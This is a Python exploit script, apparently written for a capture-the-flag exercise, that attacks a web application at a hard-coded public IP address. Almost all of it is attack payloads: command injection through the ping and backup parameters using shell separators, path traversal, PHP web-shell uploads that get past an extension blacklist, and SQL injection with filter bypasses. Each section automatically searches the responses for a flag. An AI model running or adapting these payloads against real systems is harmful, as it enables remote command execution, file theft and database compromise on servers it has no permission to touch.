import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_ping_command_exec_new():
    """根据提示重新测试Ping命令执行"""
    print_section("1. Ping命令执行测试")
    
    ping_url = f"{TARGET}/ping"
    
    # 尝试各种绕过方式
    ping_payloads = [
        # 正常Ping
        "127.0.0.1",
        # 尝试分号绕过
        "127.0.0.1;type F:\\small peoject\\python-lab\\flag.txt",
        "127.0.0.1;type F:\\flag.txt",
        "127.0.0.1;type C:\\flag.txt",
        "127.0.0.1;dir F:\\",
        "127.0.0.1;dir C:\\",
        "127.0.0.1;whoami",
        "127.0.0.1;ipconfig",
        # 尝试&&绕过
        "127.0.0.1&&type F:\\flag.txt",
        "127.0.0.1&&type C:\\flag.txt",
        "127.0.0.1&&whoami",
        # 尝试|绕过
        "127.0.0.1|type F:\\flag.txt",
        "127.0.0.1|type C:\\flag.txt",
        "127.0.0.1|whoami",
        # 尝试其他分隔符
        "127.0.0.1`type F:\\flag.txt`",
        "127.0.0.1$(type F:\\flag.txt)",
        "127.0.0.1%0a%0atype F:\\flag.txt",
        "127.0.0.1%0d%0atype F:\\flag.txt",
        "127.0.0.1%09type F:\\flag.txt",
        # 尝试不同的IP格式
        "localhost;type F:\\flag.txt",
        "127.1;type F:\\flag.txt",
        "127.0.0.1.1;type F:\\flag.txt",
        "[127.0.0.1];type F:\\flag.txt",
        "0;type F:\\flag.txt",
        "0.0.0.0;type F:\\flag.txt",
        "::1;type F:\\flag.txt",
        # 尝试不带IP
        ";type F:\\flag.txt",
        "&&type F:\\flag.txt",
        "|type F:\\flag.txt",
        "`type F:\\flag.txt`",
        "$(type F:\\flag.txt)",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_backup_command_exec_new():
    """根据提示重新测试Backup命令执行"""
    print_section("2. Backup命令执行测试")
    
    backup_url = f"{TARGET}/backup"
    
    backup_payloads = [
        # 正常路径
        "F:\\small peoject\\python-lab\\uploads",
        # 尝试路径遍历
        "F:\\small peoject\\python-lab\\uploads\\..\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads\\..\\..\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads/../flag.txt",
        "F:\\small peoject\\python-lab\\uploads/../../flag.txt",
        # 尝试命令注入
        "F:\\small peoject\\python-lab\\uploads;type F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads;type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads;type C:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads;dir F:\\",
        "F:\\small peoject\\python-lab\\uploads;dir C:\\",
        "F:\\small peoject\\python-lab\\uploads;whoami",
        "F:\\small peoject\\python-lab\\uploads;ipconfig",
        # 尝试&&注入
        "F:\\small peoject\\python-lab\\uploads&&type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads&&type C:\\flag.txt",
        # 尝试|注入
        "F:\\small peoject\\python-lab\\uploads|type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads|type C:\\flag.txt",
        # 尝试其他格式
        "F:\\small peoject\\python-lab\\uploads`type F:\\flag.txt`",
        "F:\\small peoject\\python-lab\\uploads$(type F:\\flag.txt)",
        # 尝试直接读取
        "F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\flag",
        "F:\\flag.txt",
        "F:\\flag",
        "C:\\flag.txt",
        "C:\\flag",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_upload_blacklist_bypass():
    """根据提示测试上传漏洞（扩展名黑名单）"""
    print_section("3. 上传漏洞测试（黑名单绕过）")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 根据提示，上传只检查扩展名黑名单和Content-Type
    # 这意味着validate_image_payload可能没有被执行
    # 让我尝试上传各种文件
    
    test_files = [
        # 普通图片
        ("test.jpg", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09\xff\xd9"),
        # PHP文件伪装成图片
        ("test.php.jpg", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.jpg.php", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.php", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.phtml", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.phps", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.php3", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.php4", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.phtm", "image/jpeg", b"<?php system('whoami'); ?>"),
        # Python文件
        ("test.py", "image/jpeg", b"#!/usr/bin/env python\nexec('import os; print(os.system(\"whoami\"))')"),
        ("test.py.jpg", "image/jpeg", b"#!/usr/bin/env python\nexec('import os; print(os.system(\"whoami\"))')"),
        # 其他脚本
        ("test.jsp", "image/jpeg", b"<% out.println('test'); %>"),
        ("test.asp", "image/jpeg", b"<% Response.Write(\"test\") %>"),
        ("test.aspx", "image/jpeg", b"<% Response.Write(\"test\") %>"),
        # 空扩展名
        ("test", "image/jpeg", b"test content"),
        # 特殊扩展名
        ("test.txt", "image/jpeg", b"test content"),
        ("test.html", "image/jpeg", b"<html><body>test</body></html>"),
        ("test.xml", "image/jpeg", b"<?xml version='1.0'?><test>hello</test>"),
        # 大小写混淆
        ("test.PhP", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.PHP", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.pHp", "image/jpeg", b"<?php system('whoami'); ?>"),
        # 空字节
        ("test.php%00.jpg", "image/jpeg", b"<?php system('whoami'); ?>"),
        ("test.jpg%00.php", "image/jpeg", b"<?php system('whoami'); ?>"),
    ]
    
    for filename, content_type, content in test_files:
        try:
            files = {"file": (filename, content, content_type)}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        # 测试文件是否被执行
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     内容: {r2.text[:200]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            return
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_sql_bypass():
    """根据提示测试SQL注入绕过"""
    print_section("4. SQL注入测试（粗糙的关键字替换）")
    
    sql_url = f"{TARGET}/search"
    
    # 根据提示，搜索框做了很粗糙的关键字替换
    # 尝试各种绕过方式
    
    sql_payloads = [
        # 基础测试
        "SQL",
        "sql",
        "sQL",
        "sqL",
        "s'QL",
        "sq'L",
        "sQ'L",
        # 尝试绕过关键字替换
        "1' OR 1=1--",
        "1' OR '1'='1",
        "1' UNION SELECT 1,2,3",
        "1' UNION SELECT 1,version(),3",
        "1' UNION SELECT 1,database(),3",
        "' OR 1=1",
        "\" OR 1=1",
        "' OR 'a'='a",
        "\" OR \"a\"=\"a",
        "admin' --",
        "admin'#",
        # 尝试编码绕过
        "1' UNI/**/ON SEL/**/ECT 1,2,3",
        "1' UNION%20SELECT%201,2,3",
        "1'%20OR%201=1--",
        # 尝试大小写混淆
        "1' uNiOn sElEcT 1,2,3",
        "1' UnIoN SeLeCt 1,2,3",
        # 尝试其他方式
        "1' ORDER BY 1",
        "1' ORDER BY 2",
        "1' ORDER BY 3",
        "0' UNION SELECT 1,2,3",
        "-1' OR 1=1",
        "1' LIMIT 0,1",
        "1' OFFSET 1",
    ]
    
    for payload in sql_payloads:
        try:
            r = session.get(sql_url, params={"q": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<main[^>]*>(.*?)</main>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    # 检查是否有数据泄露
                    if "<article" in body_content and len(body_content) > 300:
                        print(f"\n  [{r.status_code}] ?q={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_ping_command_exec_new()
    test_backup_command_exec_new()
    test_upload_blacklist_bypass()
    test_sql_bypass()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()